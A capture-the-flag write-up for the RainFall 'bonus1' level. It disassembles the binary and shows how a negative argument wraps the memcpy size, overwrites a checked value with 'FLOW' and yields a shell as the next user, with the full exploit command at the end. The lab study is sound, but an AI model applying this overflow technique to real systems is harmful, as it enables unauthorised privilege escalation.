# Bonus1

we start our reverse by gdb bonus and disass the main function

```c
Dump of assembler code for function main:
   0x08048424 <+0>:	push   ebp
   0x08048425 <+1>:	mov    ebp,esp
   0x08048427 <+3>:	and    esp,0xfffffff0
   0x0804842a <+6>:	sub    esp,0x40
   0x0804842d <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>:	add    eax,0x4
   0x08048433 <+15>:	mov    eax,DWORD PTR [eax]
   0x08048435 <+17>:	mov    DWORD PTR [esp],eax
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    eax,0x1
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:	add    eax,0x8
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:	mov    edx,eax
   0x08048464 <+64>:	lea    eax,[esp+0x14]
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret
End of assembler dump.
```

after they set the $esp $ebp they pass the av[1] to the function atoi as we know atoi toke a string as params and return int and if _the string empty return 0_

```c
   0x0804842d <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>:	add    eax,0x4
   0x08048433 <+15>:	mov    eax,DWORD PTR [eax]
   0x08048435 <+17>:	mov    DWORD PTR [esp],eax
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
```

after call atoi store the return value in `[esp+0x3c]` and then check if this value lower or equal to 0x9 = 9 ifnot return 1 and leave

```c
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    eax,0x1
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
```

else if the `[esp+0x3c] <= 9` multiply this value \* 4 and store it into `ecx` this the size of memcpy they copy into `esp+0x14` av[2] `memcpy(esp + 0x14, av[2], ecx)`

```c
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:	add    eax,0x8
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:	mov    edx,eax
   0x08048464 <+64>:	lea    eax,[esp+0x14]
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
```

after that they compare esp+0x3c with 0x574f4c46 = "FLOW" if is equal they call exec('/bin/bash')

we add a break point in `<+84>` to understand what happend in memory we run our program

> r 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```c
0xbffff6a4:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6b4:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6c4:	0x41414141	0x080484b9	0x00000009	0x080484b0
                                        ^
                                        |
            this the value return of atoi which is must be equal to 'FLOW'
            So we need to fill more memory to override this value more 8 char
```

in the line <+47> we have `<< 2` we need more 8 char, the size of memcpy atoi(av[1]) \* 4 that's mean we need to enter 11 cause 11 \* 4 = 44 characters

> 11 decimal = 00000000000000000000000000001011 we complete with 16 zero we work in 32 bits

we cant pass 11 because they check if the value <= 9 and but we can enter -11 😉 we just need to change the value which mean the sign the first value in the binary

> -11 = 10000000000000000000000000001011 decimal => -2147483637

with shifting << 2

```
    10 00 00 00 00 00 00 00 00 00 00 00 00 00 10 11 << 2

    10 00 00 00 00 00 00 00 00 00 00 00 00 00 10 11
     ^                                              ^
     |                                              |
we remove this                              we add 00 here

result is  : 00 00 00 00 00 00 00 00 00 00 00 00 00 10 11 00  = 44

```

```c
bonus1@RainFall:~$ ./bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
$ whoami
bonus2
$
```
